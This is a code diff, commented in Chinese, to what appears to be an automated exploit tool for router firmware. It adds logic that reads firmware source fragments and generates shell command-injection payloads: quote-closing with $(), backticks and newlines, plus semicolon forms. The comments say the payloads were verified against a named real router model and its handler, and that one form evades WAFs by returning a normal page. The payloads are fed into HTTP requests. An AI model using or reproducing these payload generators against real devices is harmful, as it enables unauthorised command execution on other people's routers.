@@ -83,19 +83,50 @@ def guess_param(chain: dict) -> str:
     return "input"
 
 
-def shell_payloads(cmd: str) -> list[str]:
+def guard_hints(chain: dict) -> dict:
+    """从 M3 给的 guard 片段里读出「处理器怎么拼命令」。
+
+    这是把"读过一次源码的经验"变成可复用的判据：
+      - `echo '%s'` 说明值被单引号包住 → 优先闭合引号；
+      - `!= ';'` + `= '\0'` 说明分号会被截断 → 分号类载荷直接不用。
+    实测 Edimax BR-6478AC 的 formStaDrvSetup 就是这两条同时成立。
+    """
+    g = f"{chain.get('guard') or ''} {chain.get('via') or ''}"
+    return {
+        "single_quoted": bool(re.search(r"echo\s+'%s'|'%s'", g)),
+        "semicolon_cut": bool(re.search(r"!=\s*';'|!=\s*\";\"", g)),
+    }
+
+
+def shell_payloads(cmd: str, hints: dict | None = None) -> list[str]:
     """把一条任意 shell 命令包成几种能突破常见包装的形态。
 
     固件里命令常写成 `sprintf(buf, "echo '%s' > /tmp/x", param)` —— 值被单引号
-    包住，很多实现还会在第一个 `;` 处截断。所以 `;id;` 打不进去，
-    真正有效的是「单引号闭合 + 换行」。实测 Edimax BR-6478AC 就是这样打通的。
+    包住，很多实现还会在第一个 `;` 处截断。所以 `;id;` 打不进去。
+
+    实测有效的两种（Edimax BR-6478AC V2 1.23 上都验证过）：
+      - `x'$(cmd)'`   闭合单引号 + 命令替换（**响应仍是正常页面，不报错**）
+      - `x'\n cmd \n'` 闭合 + 换行
+
+    `hints`（来自 guard_hints）会把明显无效的形态去掉，并把最可能的排到前面。
     """
-    return [
-        f"x'\n{cmd}\n'",      # 闭引号 + 换行：最通用
+    hints = hints or {}
+    forms = [
+        f"x'$({cmd})'",        # 闭引号 + $()：最不容易被 WAF/校验盯上
+        f"x'`{cmd}`'",         # 闭引号 + 反引号
+        f"x'\n{cmd}\n'",      # 闭引号 + 换行
         f"x'\n{cmd}\n",       # 有的实现最后没有收尾引号
-        f"{cmd}",             # 无包装的情况
-        f";{cmd};",           # 经典（会被分号截断的实现无效）
+        f"{cmd}",              # 无包装
+        f";{cmd};",            # 经典（分号会被截断的实现无效）
     ]
+    if hints.get("semicolon_cut"):
+        forms = [f for f in forms if not f.startswith(";")]
+    if hints.get("single_quoted"):
+        # 已经是单引号包装：把闭合类排前面，去掉"无包装"这种低概率项
+        quote_first = [f for f in forms if f.startswith("x'")]
+        rest = [f for f in forms if not f.startswith("x'") and f != cmd]
+        forms = quote_first + rest
+    return forms
 
 
 _HEADER_OF = {
@@ -166,7 +197,8 @@ def build_requests(chain: dict, endpoint: dict | None = None,
         or (chain.get("page_params") or [""])[0].strip() \
         or guess_param(chain)
     cat = (chain.get("sink_category") or "").lower()
-    values = shell_payloads(cmd) if (cmd and cat in ("ci", "cmd")) else payloads(cat)
+    values = (shell_payloads(cmd, guard_hints(chain))
+              if (cmd and cat in ("ci", "cmd")) else payloads(cat))
     channel, hdr = channel_of(chain)
     if channel == "header":
         # 头注入：载荷放进 Cookie / Content-Type 这类头里，body 留空
